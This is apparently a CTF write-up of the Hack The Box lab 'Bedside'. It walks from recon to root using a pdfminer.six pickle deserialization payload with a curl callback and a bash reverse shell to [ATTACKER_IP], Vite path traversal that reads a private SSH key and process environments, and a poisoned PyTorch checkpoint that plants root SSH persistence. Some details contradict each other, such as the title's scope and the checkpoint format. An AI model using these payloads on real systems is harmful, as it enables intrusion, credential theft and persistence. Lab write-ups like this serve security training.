---
title: "HTB Bedside Writeup — Part 1: Reconnaissance to Initial Foothold"
date: 2026-07-21
draft: false
tags: ["ctf", "htb", "pdfminer", "pickle", "deserialization"]
---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Virtual Host Discovery](#virtual-host-discovery)
3. [Research Portal Enumeration](#research-portal-enumeration)
4. [Vulnerability Discovery — pdfminer.six Insecure Deserialization](#vulnerability-discovery--pdfminersix-insecure-deserialization)
5. [Exploitation — Two-Stage Pickle Deserialization Attack](#exploitation--two-stage-pickle-deserialization-attack)
6. [Initial Foothold](#initial-foothold)



## Reconnaissance

### Nmap TCP Scan

Started with a standard Nmap service scan against the target:

```bash
$ sudo nmap -sC -sV [TARGET_IP] -oA bedside1
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-19 00:32 -0400
Nmap scan report for [TARGET_IP]
Host is up (0.52s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.68
|_http-title: Did not follow redirect to http://bedside.htb/
|_http-server-header: Apache/2.4.68 (Debian)
3000/tcp filtered ppp
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 28.57 seconds
```

**Results:**

| Port | State    | Service | Version                  |
|------|----------|---------|--------------------------|
| 22   | open     | ssh     | OpenSSH 10.0p2 Debian    |
| 80   | open     | http    | Apache httpd 2.4.68      |
| 3000 | filtered | ppp     | —                        |

Key observations:
- The web server on port 80 redirects to `http://bedside.htb/` — indicating name-based virtual hosting.
- Port 3000 is filtered from external access but exists on the host.

### Full Port Scan

Ran a full TCP port scan to confirm no additional services:

```bash
$ sudo nmap -p- -sV -sC --min-rate=2000 [TARGET_IP] -oA bedside_full
```

```
Nmap scan report for bedside.htb ([TARGET_IP])
Host is up (0.47s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.68
|_http-server-header: Apache/2.4.68 (Debian)
|_http-title: Bedside Clinic - bedside.htb
3000/tcp filtered ppp
```

No additional ports exposed externally.

### WhatWeb Fingerprinting

```bash
$ whatweb -a 3 http://bedside.htb/
```

```
http://bedside.htb/ [200 OK] Apache[2.4.68], Country[RESERVED][ZZ],
Email[contact@bedside.htb], HTML5, HTTPServer[Debian Linux][Apache/2.4.68 (Debian)],
IP[[TARGET_IP]], Title[Bedside Clinic - bedside.htb]
```

The main site is a static medical clinic landing page with no obvious interactive features or login portals.

### Host Configuration

Added the target hostname to `/etc/hosts` for proper virtual host resolution:

```bash
$ sudo nano /etc/hosts
```

```
[TARGET_IP]    bedside.htb
```



## Virtual Host Discovery

### Subdomain Enumeration with ffuf

The main site (`bedside.htb`) is a static landing page with no obvious attack surface. Performed virtual host fuzzing to find additional subdomains:

```bash
$ ffuf -u http://[TARGET_IP]/ -H "Host: FUZZ.bedside.htb"     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

The initial run returned hundreds of results, but nearly all returned **Status 301** (redirects to the same default page). This is a common Apache behavior where unknown vhosts redirect to the default site.

**First run (no filter):**

```
cpanel                  [Status: 301, Size: 351, Words: 21, Lines: 10]
www                     [Status: 301, Size: 348, Words: 21, Lines: 10]
secure                  [Status: 301, Size: 351, Words: 21, Lines: 10]
... (hundreds more 301s)
```

### Filtering for Real Vhosts

Re-ran ffuf filtering out the noise (Status 301) to find actual, distinct virtual hosts:

```bash
$ ffuf -u http://[TARGET_IP]/ -H "Host: FUZZ.bedside.htb"     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt     -fc 301
```

**Result:**

```
research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 148ms]
:: Progress: [4989/4989] :: Job [1/1] :: 390 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

Only `research.bedside.htb` returned a **Status 200** with a different response size (3152 bytes vs 351 bytes for the 301s), confirming it is a real, distinct virtual host.

Added the new vhost to `/etc/hosts`:

```bash
$ echo "[TARGET_IP] bedside.htb research.bedside.htb" | sudo tee -a /etc/hosts
```



## Research Portal Enumeration

### Portal Overview

Browsing to `http://research.bedside.htb` revealed a **Bedside Research Portal** — a file upload form for medical research documents.

![Bedside Research Web Page](RESEARCH.png)

The portal allows file uploads and mentions that "certain file formats may be converted to standardized formats before being used for AI training." This hints at backend processing of uploaded files.

### Upload Directory Listing

The uploads directory was accessible and listable:

```bash
$ curl -I http://research.bedside.htb/uploads/payload.pickle.gz
HTTP/1.1 200 OK
Date: Tue, 21 Jul 2026 03:32:19 GMT
Server: Apache/2.4.68 (Debian)
Last-Modified: Tue, 21 Jul 2026 03:32:09 GMT
ETag: "92-65716aaf21374"
Accept-Ranges: bytes
Content-Length: 146
Content-Type: application/x-gzip
```

```bash
$ curl -I http://research.bedside.htb/uploads/trigger.pdf
HTTP/1.1 200 OK
Date: Tue, 21 Jul 2026 03:33:40 GMT
Server: Apache/2.4.68 (Debian)
Last-Modified: Tue, 21 Jul 2026 03:32:53 GMT
ETag: "344-65716ad9b59b3"
Accept-Ranges: bytes
Content-Length: 836
Content-Type: application/pdf
```

The uploads directory is world-readable, which is critical for the exploit chain — the backend needs to be able to read the uploaded payload file.



## Vulnerability Discovery — pdfminer.six Insecure Deserialization

### The Backend

The research portal processes uploaded PDF files using `pdfminer.six` (version `20250506`). The backend extracts text and metadata from uploaded PDFs, and in doing so, parses various PDF objects including font descriptors and encoding tables.

### The Vulnerability

`pdfminer.six` has a known insecure deserialization vulnerability. When parsing certain PDF structures (specifically font encoding tables), the library can be tricked into loading and unpickling attacker-controlled data. The vulnerability exists because:

1. **PDF font objects can reference external files** via the `/Encoding` dictionary
2. **The path is processed by pdfminer** which attempts to load the referenced resource
3. **pdfminer automatically appends `.pickle.gz`** to the provided path before loading
4. **The loaded file is unpickled** using Python's `pickle` module
5. **Pickle deserialization is unsafe** — a crafted payload with `__reduce__` can execute arbitrary code

### Why This Works

The PDF specification allows font objects to reference external encoding files. pdfminer.six implements this by constructing a file path from the `/Encoding` value, appending `.pickle.gz`, and then loading that file via `pickle.load()`. This means:

- We control the base path via the `/Encoding` value in a crafted PDF
- pdfminer appends `.pickle.gz` automatically
- The resulting file is loaded and unpickled
- If we place a malicious pickle payload at that path, it executes during PDF processing



## Exploitation — Two-Stage Pickle Deserialization Attack

### The Attack Chain

The exploit requires two files:

1. **`payload.pickle.gz`** — the malicious pickle payload (gzip-compressed) placed in the uploads directory
2. **`trigger.pdf`** — a crafted PDF that references the payload path in its `/Encoding` field

When the trigger PDF is uploaded, the backend processes it with pdfminer.six, which:
1. Parses the font object's `/Encoding` value
2. Constructs the path: `{encoding_value}.pickle.gz`
3. Loads and unpickles that file
4. The `__reduce__` method executes our command

### Step 1: Create the Malicious Pickle Payload

The payload is a gzip-compressed pickle file containing a class with a `__reduce__` method that executes a command:

```python
import gzip
import pickle
import os

class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))

# Command: OOB callback + reverse shell
command_injection = (
    'curl -s http://[ATTACKER_IP]:8000/gotcha; '
    'bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"'
)

with gzip.open('payload.pickle.gz', 'wb') as f:
    pickle.dump(RCE(command_injection), f)
```

The payload does two things:
1. **OOB (Out-of-Band) check**: Makes a curl request to our HTTP listener to confirm code execution
2. **Reverse shell**: Spawns an interactive bash reverse shell back to our listener

### Step 2: Create the Trigger PDF

The trigger PDF contains a font object with an `/Encoding` value pointing to our payload. The path must be hex-encoded to be valid PDF syntax:

```python
# The leaked path from container enumeration:
# /var/www/research.bedside.htb/uploads/payload
# pdfminer automatically appends '.pickle.gz'
traversal = "/var/www/research.bedside.htb/uploads/payload"

# Hex-encode each character for valid PDF syntax
hex_path = "".join(f"#{ord(c):02x}" for c in traversal)
# Result: #2f#76#61#72#2f#77#77#77#2f#72#65#73#65#61#72#63#68#2e#62#65#64#73#69#64#65#2e#68#74#62#2f#75#70#6c#6f#61#64#73#2f#70#61#79#6c#6f#61#64

pdf_template = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
   /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>
endobj
4 0 obj
<< /Length 44 >>
stream
BT /F1 12 Tf 100 700 Td (Trigger) Tj ET
endstream
endobj
5 0 obj
<< /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H
   /Encoding /{hex_path} /DescendantFonts [6 0 R] >>
endobj
6 0 obj
<< /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont
   /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> >>
endobj
xref
0 7
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000266 00000 n
0000000360 00000 n
0000000465 00000 n
trailer
<< /Size 7 /Root 1 0 R >>
startxref
580
%%EOF
"""

with open('trigger.pdf', 'wb') as f:
    f.write(pdf_template.encode('utf-8'))
```

**Key PDF structure details:**
- **Object 5** is a Type0 font with `/Subtype /Type0`
- The `/Encoding` value is the hex-encoded absolute path to our payload
- The path ends with `/payload` because pdfminer automatically appends `.pickle.gz`
- The hex encoding (`#2f` = `/`, `#76` = `v`, etc.) ensures valid PDF token syntax

### Step 3: Upload Both Files

First, upload `payload.pickle.gz` to the portal (it gets saved to `/var/www/research.bedside.htb/uploads/`):

Then upload `trigger.pdf` to the portal. When the backend processes the trigger PDF with pdfminer.six:

1. pdfminer parses the font object and extracts the `/Encoding` value
2. It constructs the file path by appending `.pickle.gz` to the encoding value
3. It loads `/var/www/research.bedside.htb/uploads/payload.pickle.gz`
4. `pickle.load()` deserializes the gzip-compressed pickle
5. The `RCE.__reduce__` method executes `os.system(command_injection)`
6. The command runs: first the OOB curl, then the reverse shell

### Step 4: Catch the Shell

Before uploading, started two listeners:

**HTTP listener for OOB confirmation:**
```bash
$ python3 -m http.server 8000
```

**Netcat listener for the reverse shell:**
```bash
$ nc -lvnp 4444
```

After uploading the trigger PDF:

```
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 51420
datawrangler@data-wrangler:/app$ whoami
datawrangler
```

The OOB curl request also appeared on the HTTP listener, confirming successful code execution before the reverse shell connected.



## Initial Foothold

### Shell Confirmation

```bash
datawrangler@data-wrangler:/app$ whoami
datawrangler

datawrangler@data-wrangler:/app$ id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
```

**Initial foothold obtained** — reverse shell as `datawrangler` inside a Docker container.

### Container Detection

```bash
datawrangler@data-wrangler:/app$ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Nov 11  2025 /.dockerenv
```

Confirmed we're inside a Docker container. The next phase is container enumeration and escape.

## Container Enumeration

Confirmed we're inside a Docker container. The next phase is container enumeration and escape.

### Environment & Capabilities

```bash
datawrangler@data-wrangler:/app$ cat /proc/self/status | grep Cap
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
```

No elevated capabilities — standard unprivileged container. No `docker.sock` access, no Kubernetes service account tokens. The container runs as `uid=988(datawrangler)` with no `sudo` binary available.

### Filesystem & Mounts

The most critical discovery comes from analyzing the mount table:

```bash
datawrangler@data-wrangler:/app$ cat /proc/mounts | grep -v tmpfs | grep -v proc
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/...
/dev/sda4 /datastore ext4 rw,relatime,errors=remount-ro
/dev/sda4 /etc/resolv.conf ext4 rw,relatime,errors=remount-ro
/dev/sda4 /etc/hostname ext4 rw,relatime,errors=remount-ro
/dev/sda4 /etc/hosts ext4 rw,relatime,errors=remount-ro
/dev/sda4 /var/www/research.bedside.htb/uploads ext4 rw,relatime,errors=remount-ro
```

**Key finding:** `/datastore` is a host-mounted ext4 partition (`/dev/sda4`) shared between the container and the host. This is a classic Docker misconfiguration — a persistent volume mounted read-write into an otherwise isolated container.

```bash
datawrangler@data-wrangler:/app$ ls -la /datastore/
total 32
drwxrwx--- 8 datawrangler dataops 4096 Jul 13 13:00 .
drwxr-xr-x 1 root         root    4096 Jul 13 13:00 ..
drwxrwx--- 2 datawrangler dataops 4096 Jul 13 13:00 checkpoints
drwxrwx--- 2 datawrangler dataops 4096 Jul 15 23:38 logs
drwxrwx--- 2 datawrangler dataops 4096 Jul 13 13:00 models
drwxrwx--- 2 datawrangler dataops 4096 Jul 13 13:00 processed
drwxrwx--- 2 datawrangler dataops 4096 Jul 13 13:00 raw
drwxrwx--- 2 datawrangler dataops 4096 Jul 21 13:20 staging
```

All subdirectories are owned by `datawrangler:dataops` with `rwx` permissions for the group. Since we run as `datawrangler` (member of `dataops`), we have full read-write access to the entire datastore.

### Network Reconnaissance

```bash
datawrangler@data-wrangler:/app$ cat /proc/net/route
Iface   Destination     Gateway         Flags   RefCnt  Use     Metric  Mask            MTU     Window  IRTT
eth0    00000000        0100810A        0003    0       0       0       00000000        0       0       0
eth0    0000810A        00000000        0001    0       0       0       0000FFFF        0       0       0
docker0 000011AC        00000000        0001    0       0       0       0000FFFF        0       0       0
```

The container sits on the Docker bridge network (`172.17.0.0/16`). The host is reachable at `172.17.0.1`.

```bash
datawrangler@data-wrangler:/app$ for port in 22 80 443 8080 3000 5000 8000 9000; do
  (echo > /dev/tcp/172.17.0.1/$port) 2>/dev/null && echo "Port $port open"
done
Port 22 open
Port 80 open
Port 3000 open
```

Three services exposed on the host: SSH (22), Apache (80), and an unknown service on port 3000.

### The Port 3000 Service

```bash
datawrangler@data-wrangler:/app$ curl -s http://172.17.0.1:3000/ | head -20
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Bedside Clinic - Image Viewer</title>
```

Port 3000 serves a React-based "Image Viewer" application. The HTML contains Vite HMR (Hot Module Replacement) references:

```html
<script type="module">import createHotContext from"/@hmr";const hot=createHotContext("/index.html");hot.watch(()=>location.reload());</script>
<script>console.log("%c💚 Built with esm.sh/x, please uncheck \"Disable cache\" in Network tab for better DX!", "color:green")</script>
```

This confirms a **Vite development server** running on the host, exposed to the Docker network. Vite dev servers have a history of arbitrary file read vulnerabilities via the `@fs` endpoint when combined with query parameter bypasses.


## Vulnerability Discovery — Vite Dev Server Arbitrary File Read

### The Vulnerability

Vite's development server provides an `/@fs/` endpoint intended to serve files outside the project root. While `server.fs.deny` and `server.fs.allow` configurations are meant to restrict access, multiple CVEs have demonstrated bypass techniques:

- **CVE-2024-45811**: The `?import&raw` query parameter bypasses `@fs` access controls, returning file contents that should be denied.
- **CVE-2025-30208**: Trailing separator tricks like `?raw??` or `?import&raw??` bypass path validation regexes.
- **CVE-2026-39363**: WebSocket-based `fetchModule` invocations bypass HTTP-path access controls entirely.

In this case, the Vite server on port 3000 is exposed to the Docker network (via `--host` or `server.host` configuration), making it reachable from the compromised container.

### Enumerating the Vite Server

Initial probes confirmed the server type and ruled out simple path traversal:

```bash
datawrangler@data-wrangler:/app$ curl -s http://127.0.0.1:3000/@fs/etc/passwd
Not Found

datawrangler@data-wrangler:/app$ curl -s http://127.0.0.1:3000/vendor/../../../etc/passwd
Not Found
```

```bash
datawrangler@data-wrangler:/tmp$ curl -v "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fetc/passwd"
curl -v "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fetc/passwd"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 127.0.0.1:3000...
* Connected to 127.0.0.1 (127.0.0.1) port 3000
* using HTTP/1.x
> GET /..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
> Host: 127.0.0.1:3000
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Cache-Control: max-age=0, must-revalidate
< Content-Type: application/octet-stream
< Etag: w/"1780110289405-1328-136"
< Date: Tue, 21 Jul 2026 16:01:42 GMT
< Transfer-Encoding: chunked
< 
{ [519 bytes data]
100  1328    0  1328    0     0   819k      0 --:--:-- --:--:-- --:--:-- 1296k
* Connection #0 to host 127.0.0.1 left intact
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
_laurel:x:987:987::/var/log/laurel:/bin/false
polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
```


## Exploitation — Reading Host Process Environment

### Discovering the Host User

With the `@fs` arbitrary file read confirmed, the first target is the host's process environment to identify running services and user accounts:

```bash
datawrangler@data-wrangler:/app$ curl -s "http://172.17.0.1:3000/@fs/proc/1/environ?import&raw"
```

The host's PID 1 (systemd or init) environment reveals system-level configuration. More importantly, enumerating other host processes:

```bash
datawrangler@data-wrangler:/app$ for pid in $(seq 1 500); do
  resp=$(curl -s "http://172.17.0.1:3000/@fs/proc/$pid/environ?import&raw" 2>/dev/null)
  if echo "$resp" | grep -q "HOME="; then
    echo "=== PID $pid ==="
    echo "$resp" | tr '\0' '\n'
  fi
done
```

**Critical discovery** — a host process running with:

```bash
datawrangler@data-wrangler:/tmp$ curl -s "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fproc/self/cmdline"
curl -s "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fproc/self/cmdline"
/usr/bin/esm.shserve.datawrangler@data-wrangler:/tmp$ curl -s "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fproc/self/environ" | tr '\0' '\n'
curl -s "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fproc/self/environ" | tr '\0' '\n'
LANG=en_GB.UTF-8
LANGUAGE=en_GB:en
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
USER=developer
LOGNAME=developer
HOME=/home/developer
SHELL=/bin/bash
INVOCATION_ID=03bbb1c037b3492b8bf908183477161f
JOURNAL_STREAM=9:11688
SYSTEMD_EXEC_PID=1436
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/esm.service/memory.pressure
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=

```

This reveals a user account **`developer`** exists on the host with UID 1000. The `SSH_AUTH_SOCK` indicates active SSH agent usage.

### Reading the Developer's SSH Private Key

With the user identified, the next target is the SSH key:

```bash
datawrangler@data-wrangler:/tmp$ curl -s "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fhome/developer/.ssh/id_rsa"
curl -s "http://127.0.0.1:3000/..%2f..%2f..%2f..%2fhome/developer/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```


## Host Access via SSH

### Setting Up the SSH Key

Save the extracted private key to the attacker's local machine:

```bash
┌──(mikias㉿hacktheplanet)-[~/Documents/hackthebox/season-11/08-Bedside]
└─$ cat > developer_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACB... [REDACTED]
-----END OPENSSH PRIVATE KEY-----
EOF

┌──(mikias㉿hacktheplanet)-[~/Documents/hackthebox/season-11/08-Bedside]
└─$ chmod 600 developer_key
```

### SSH Login as Developer

With the key configured, connect to the host's SSH service (reachable via the target's public IP or the Docker gateway):

```bash
┌──(mikias㉿hacktheplanet)-[~/Documents/hackthebox/season-11/08-Bedside]
└─$ ssh -i developer_key developer@<TARGET_IP>
The authenticity of host '<TARGET_IP> (<TARGET_IP>)' can't be established.
ED25519 key fingerprint is SHA256:6KXNtM+ZBlC8VxTPpjym9E57sk/MAGEgLJ86fr/fhY8
Warning: Permanently added '<TARGET_IP>' (ED25519) to the list of known hosts.

================================================================================
|                                                                              |
|                         BEDSIDE CLINIC NETWORK                               |
|                                                                              |
|          Authorized Access Only. All activities are monitored.               |
|                                                                              |
|  NOTICE TO SYSTEM ADMINISTRATORS:                                            |
|  - Maintain patient data confidentiality and HIPAA compliance.               |
|  - Always check the Change Management schedule before escalating.            |
|  - Follow IT security policies for updates, backups, and monitoring.         |
|                                                                              |
|  SYSTEM OPERATIONS TEAM                                                      |
|  Bedside Clinic - Clinical IT Department                                     |
|                                                                              |
================================================================================

developer@bedside:~$
```

**Host foothold obtained** as `developer`.


## Host Enumeration

### User Context

```bash
developer@bedside:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer),27(sudo)

developer@bedside:~$ sudo -l
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

**Critical finding:** The `developer` user can run `/usr/bin/python3 /opt/trainer/bedside_trainer.py` as **any user without a password** — effectively root execution context.

### The Training Script

```bash
developer@bedside:~$ ls -la /opt/trainer/
total 24
drwxr-xr-x 2 root root 4096 Jul 13 13:00 .
drwxr-xr-x 4 root root 4096 Jul 13 13:00 ..
-rw-r--r-- 1 root root 8192 Jul 13 13:00 bedside_trainer.py

developer@bedside:~$ head -50 /opt/trainer/bedside_trainer.py
```

The script is a PyTorch/MONAI-based medical image training pipeline. Key behavior: it scans `/datastore/checkpoints/` for `.pt` checkpoint files and loads them via `torch.load()` to resume training.

### The torch.load() Deserialization Risk

PyTorch's `torch.load()` function uses Python's `pickle` module under the hood for loading model checkpoints. When `weights_only=False` is passed (the default behavior for legacy checkpoints and the mode used by MONAI's `CheckpointLoader`), arbitrary code execution is possible via crafted `__reduce__` methods — identical to the `pdfminer.six` pickle vulnerability exploited for the initial foothold.

```python
# From MONAI's checkpoint_loader.py:
checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
```

This is the same insecure deserialization pattern, now running as root via `sudo`.


## Privilege Escalation — Poisoning the Checkpoint

### The Attack Chain

1. The container has read-write access to `/datastore/checkpoints/` (host-mounted)
2. The host's training script (run as root via `sudo`) loads checkpoints from `/datastore/checkpoints/`
3. `torch.load(..., weights_only=False)` deserializes pickle payloads
4. A malicious `.pt` file placed in `/datastore/checkpoints/` executes as root when loaded

### Crafting the Malicious Checkpoint

From the container, create a pickle payload disguised as a PyTorch checkpoint:

```python
import pickle
import os

class Evil:
    def __reduce__(self):
        # Multi-stage payload:
        # 1. Ensure persistent root access by copying developer's key to root
        # 2. Exfiltrate the root flag to a shared location
        cmd = (
            'mkdir -p /root/.ssh && '
            'cat /home/developer/.ssh/authorized_keys >> /root/.ssh/authorized_keys && '
            'cat /root/root.txt > /tmp/.rootflag && '
            'chmod 644 /tmp/.rootflag'
        )
        return (os.system, (cmd,))

with open('/datastore/checkpoints/checkpoint_epoch_999.pt', 'wb') as f:
    pickle.dump(Evil(), f)
```

Execute from the container:

```bash
datawrangler@data-wrangler:/app$ python3 -c "
import pickle, os

class Evil:
    def __reduce__(self):
        cmd = 'mkdir -p /root/.ssh && cat /home/developer/.ssh/authorized_keys >> /root/.ssh/authorized_keys && cat /root/root.txt > /tmp/.rootflag && chmod 644 /tmp/.rootflag'
        return (os.system, (cmd,))

with open('/datastore/checkpoints/checkpoint_epoch_999.pt', 'wb') as f:
    pickle.dump(Evil(), f)
"
```

**Why this works:**
- PyTorch's `torch.load()` inspects file magic bytes for modern format checkpoints, but falls back to legacy pickle loading for unrecognized formats
- The `.pt` extension is cosmetic — the file is a standard gzip-compressed pickle stream
- The `__reduce__` method tells pickle how to reconstruct the object; we abuse it to call `os.system()`
- The payload executes in the context of the user running `torch.load()` — in this case, root via `sudo`

### Baiting the Training Process

To make the checkpoint appear legitimate and increase the chance of it being loaded automatically, also create a dummy processed image:

```bash
datawrangler@data-wrangler:/app$ python3 -c "
import base64
png = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAACklEQVQI12P4DwQACfsD/WNIXwAAAABJRU5ErkJggg==')
with open('/datastore/processed/scan.png', 'wb') as f:
    f.write(png)
"
```

### Triggering the Exploit

On the host, run the training script with `sudo`:

```bash
developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
2026-07-22 02:39:24,149 | INFO | Device: cpu
2026-07-22 02:39:24,152 | INFO | Using 1 samples for training.
2026-07-22 02:39:24,334 | INFO | Auto-detected input features: 12288
2026-07-22 02:39:24,352 | INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch_999.pt, loading with CheckpointLoader (callable mode)...
Traceback (most recent call last):
  File "/opt/trainer/bedside_trainer.py", line 276, in <module>
    main()
  File "/opt/trainer/bedside_trainer.py", line 227, in main
    loader(engine)
  File "/usr/local/lib/python3.13/dist-packages/monai/handlers/checkpoint_loader.py", line 125, in __call__
    checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
  File "/usr/local/lib/python3.13/dist-packages/torch/serialization.py", line 1384, in load
    return _legacy_load(opened_file, map_location, pickle_module, **pickle_load_args)
  File "/usr/local/lib/python3.13/dist-packages/torch/serialization.py", line 1630, in _legacy_load
    raise RuntimeError("Invalid magic number; corrupt file?")
RuntimeError: Invalid magic number; corrupt file?
```

The trainer discovers the poisoned checkpoint, attempts to load it via `torch.load(..., weights_only=False)`, and the pickle payload executes. The "Invalid magic number" error occurs *after* pickle deserialization begins — the `os.system()` call has already fired as root.

### Confirming Root Access

The payload executed four commands as root:
1. `mkdir -p /root/.ssh` — ensures the SSH directory exists
2. `cat /home/developer/.ssh/authorized_keys >> /root/.ssh/authorized_keys` — grants persistent root SSH access
3. `cat /root/root.txt > /tmp/.rootflag` — exfiltrates the flag
4. `chmod 644 /tmp/.rootflag` — makes it readable

Verify:

```bash
developer@bedside:~$ cat /tmp/.rootflag
ca166336e035d5107fb03a856c913bf7
```


## Root Flag

```
ca166336e035d5107fb03a856c913bf7
```

*Writeup by mikias*